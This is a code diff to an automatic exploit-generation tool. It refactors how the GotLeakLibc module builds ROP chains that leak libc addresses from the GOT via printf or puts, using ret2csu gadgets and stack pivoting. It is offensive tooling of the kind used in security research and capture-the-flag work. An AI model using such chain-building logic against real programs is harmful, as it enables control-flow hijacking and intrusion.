@@ -108,6 +108,8 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
 
 std::vector<RopSubchain>
 GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
+    using BaseType = BaseOffsetExpr::BaseType;
+
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -121,14 +123,14 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
     fmtStr.push_back('\x00');
 
     RopSubchain read1 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(exploit, elf, "got_leak_libc_fmt_str"),
         ConstantExpr::create(fmtStr.size(), Expr::Int64))[0];
 
     // read(0, 0, 0), setting RAX to 0 and RDI to 1.
     RopSubchain read2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
@@ -137,12 +139,12 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
     RopSubchain prep = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(elf, "got", targetSym),
+        BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     RopSubchain leak = {
         BaseOffsetExpr::create(exploit, elf, "got_leak_libc_fmt_str"),
-        BaseOffsetExpr::create(elf, "sym", "printf")
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "printf")
     };
 
     // Prepare to chain the current subchain with the next one by calling
@@ -152,7 +154,7 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
         = sizeof(uint64_t) * (read1.size() + read2.size() + prep.size() + leak.size() + read3Size);
 
     RopSubchain read3 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
         ConstantExpr::create(0x400, Expr::Int64))[0];
@@ -173,6 +175,8 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
 
 std::vector<RopSubchain>
 GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
+    using BaseType = BaseOffsetExpr::BaseType;
+
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -182,14 +186,14 @@ GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
     RopSubchain part1 = {
         ConstantExpr::create(0, Expr::Int64),  // RBP
         BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
-        BaseOffsetExpr::create(elf, "got", targetSym),
-        BaseOffsetExpr::create(elf, "sym", "puts")
+        BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "puts")
     };
 
     // XXX: Don't hardcode the offset!
     // p64(elf_base + pivot_dest + 0x30 * 10 + 16)
     RopSubchain read1 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         AddExpr::alloc(
             BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
